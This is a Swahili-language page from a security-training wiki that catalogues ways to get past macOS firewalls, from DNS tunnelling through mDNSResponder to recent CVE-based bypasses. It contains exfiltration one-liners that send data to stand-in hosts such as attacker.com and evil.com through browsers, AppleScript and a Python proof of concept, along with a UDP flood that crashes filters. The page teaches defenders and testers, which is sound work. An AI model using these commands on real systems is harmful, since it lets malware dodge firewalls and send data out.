# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Found techniques

Techniques zifuatazo zilipatikana zikifanya kazi katika baadhi ya firewall apps za macOS.

### Abusing whitelist names

- Kwa mfano, kuita malware kwa majina ya macOS processes zinazojulikana kama **`launchd`**

### Synthetic Click

- Ikiwa firewall itaomba ruhusa kutoka kwa mtumiaji, fanya malware **ibonyeze allow**

### **Use Apple signed binaries**

- Kama vile **`curl`**, lakini pia nyingine kama **`whois`**

### Well known apple domains

Firewall inaweza kuruhusu connections kwenye apple domains zinazojulikana kama **`apple.com`** au **`icloud.com`**. Pia iCloud inaweza kutumika kama C2.

### Generic Bypass

Baadhi ya mawazo ya kujaribu kubypass firewalls

### Check allowed traffic

Kujua traffic inayoruhusiwa kutakusaidia kutambua domains ambazo huenda ziko kwenye whitelist au applications ambazo zinaruhusiwa kuzifikia
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abusing DNS

Kwenye macOS, process **haizungumzi** na DNS server yenyewe. Name resolution inasimamiwa kupitia **XPC** na **`mDNSResponder`** (`/usr/sbin/mDNSResponder`), system daemon iliyosainiwa na Apple, hivyo kila lookup kwenye mashine hutoka kwenye host kama traffic **kutoka kwa `mDNSResponder`** badala ya kutoka kwa process iliyohitaji lookup hiyo. Kwa hiyo, firewalls kwa kawaida huiamini daemon hiyo bila masharti — kuikataa kungevuruga name resolution kwa mfumo mzima.<sup>[[1]](#references)</sup>

Hilo hufanya DNS kuwa channel inayobaki wazi hata firewall inapozuia sockets za malware yenyewe:<sup>[[1]](#references)</sup>

1. Malware inajaribu ku-connect na `evil.com`. Outbound connection **yake yenyewe** inachunguzwa na firewall na **kuzuiwa**.
2. Badala yake, malware inaiomba `mDNSResponder` **iresolve** `evil.com`, kupitia XPC.
3. Firewall inachunguza query inayotokana, inaona resolver huyo anayesimamiwa na Apple na aliyesainiwa, kisha **inairuhusu**.
4. Query inafika kwenye DNS server — na ikiwa attacker anaendesha authoritative server ya `evil.com`, anadhibiti ncha zote mbili za exchange.

Kwa kuwa attacker anamiliki zone hiyo, hakuna "connection" inayohitajika: data inasafirishwa kwa siri ndani ya **queried labels** (kwa mfano, `<encoded-chunk>.evil.com`) na commands zinarudi ndani ya **answer records** (TXT, A, CNAME…), ambao ni DNS tunnelling ya kawaida inayotumia process iliyo fully whitelisted.

Process yoyote isiyo na privileges inaweza kuiendesha daemon hiyo moja kwa moja, ambayo ni njia rahisi ya kuthibitisha kuwa path iko wazi:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Kupitia programu za Browser

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Kupitia process injections

Ikiwa unaweza **inject code into a process** ambayo inaruhusiwa kuunganishwa na server yoyote, unaweza bypass ulinzi wa firewall:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Vulnerabilities za hivi karibuni za macOS firewall bypass (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
Mnamo Julai 2024, Apple ilirekebisha bug critical katika Safari/WebKit iliyovuruga “Web content filter” ya mfumo mzima inayotumiwa na parental controls za Screen Time.
URI iliyoundwa mahususi (kwa mfano, yenye “://” iliyowekwa URL-encoded mara mbili) haitambuliwi na Screen Time ACL lakini inakubaliwa na WebKit, hivyo request inatumwa bila kuchujwa. Kwa hiyo, process yoyote inayoweza kufungua URL (ikiwemo code iliyo sandboxed au unsigned) inaweza kufikia domains zilizozuiwa waziwazi na mtumiaji au MDM profile.<sup>[[2]](#references)</sup>

Jaribio la vitendo (kwenye mfumo ambao haujapatiwa patch):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Hitilafu ya mpangilio wa rules za Packet Filter (PF) katika macOS 14 “Sonoma” za awali
Wakati wa mzunguko wa beta wa macOS 14, Apple ilianzisha regression katika userspace wrapper inayozunguka **`pfctl`**.
Rules zilizoongezwa kwa keyword ya `quick` (inayotumiwa na VPN kill-switches nyingi) zilipuuzwa kimya kimya, na kusababisha traffic leaks hata wakati VPN/firewall GUI iliripoti kuwa *blocked*. Hitilafu hiyo ilithibitishwa na wachuuzi kadhaa wa VPN na kurekebishwa katika RC 2 (build 23A344).

Ukaguzi wa haraka wa leak:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Kutumia huduma za helper zilizotiwa saini na Apple (legacy – pre-macOS 11.2)
Kabla ya macOS 11.2, **`ContentFilterExclusionList`** iliruhusu takriban Apple binaries 50, kama vile **`nsurlsessiond`** na App Store, kupita firewalls zote za socket-filter zilizotekelezwa kwa kutumia Network Extension framework (LuLu, Little Snitch, n.k.).
Malware ingeweza tu kuanzisha process iliyotengwa—au kuingiza code ndani yake—na ku-tunnel traffic yake kupitia socket iliyokuwa tayari imeruhusiwa. Apple iliondoa kabisa exclusion list katika macOS 11.2, lakini technique hii bado ni muhimu kwenye systems ambazo haziwezi ku-upgrade.<sup>[[3]](#references)</sup>

Mfano wa proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH za kukwepa vichujio vya domain vya Network Extension (macOS 12+)
NEFilter Packet/Data Providers hutegemea TLS ClientHello SNI/ALPN. Kwa **HTTP/3 over QUIC (UDP/443)** na **Encrypted Client Hello (ECH)**, SNI hubaki ikiwa imesimbwa, NetExt haiwezi kuchanganua mtiririko, na sheria za hostname mara nyingi hushindwa kwa kuruhusu, hivyo malware inaweza kufikia domain zilizozuiwa bila kugusa DNS.<sup>[[5]](#references)</sup>

PoC ya chini kabisa:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Ikiwa QUIC/ECH bado imewezeshwa, hii ni njia rahisi ya kukwepa hostname-filter.

### Kuyumba kwa Network Extension ya macOS 15 “Sequoia” (2024–2025)
Build za awali za 15.0/15.1 hu-crash filters za wahusika wengine za **Network Extension** (LuLu, Little Snitch, Defender, SentinelOne, n.k.). Filter inapoanza upya, macOS huondoa flow rules zake na bidhaa nyingi hushindwa kwa hali ya fail-open. Kuflood filter kwa maelfu ya short UDP flows (au kulazimisha QUIC/ECH) kunaweza kusababisha crash hiyo mara kwa mara na kuacha window ya C2/exfil, huku GUI ikiendelea kudai kuwa firewall inaendelea kufanya kazi.<sup>[[4]](#references)</sup>

Reproduction ya haraka (safe lab box):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Vidokezo vya tooling kwa macOS ya kisasa

1. Kagua sheria za sasa za PF zinazozalishwa na GUI firewalls:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Orodhesha binaries ambazo tayari zina entitlement ya *outgoing-network* (inayofaa kwa piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Sajili kiprogramu kichujio chako cha maudhui cha Network Extension katika Objective-C/Swift.
PoC ndogo ya rootless inayotuma packets kwenye socket ya ndani inapatikana katika source code ya **LuLu** ya Patrick Wardle.

## Marejeo

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Kutengeneza na Kuvunja macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple web content filter bypass inaruhusu ufikiaji usio na vizuizi wa maudhui yaliyofungwa (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple Yaondoa Kipengele cha macOS Kilichoruhusu Apps Kukwepa Usalama wa Firewall - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersecurity Products Zinaacha Kufanya Kazi Baada ya Sasisho la macOS Sequoia - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Tumia network protection kusaidia kuzuia miunganisho ya macOS kwenye tovuti hatari - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
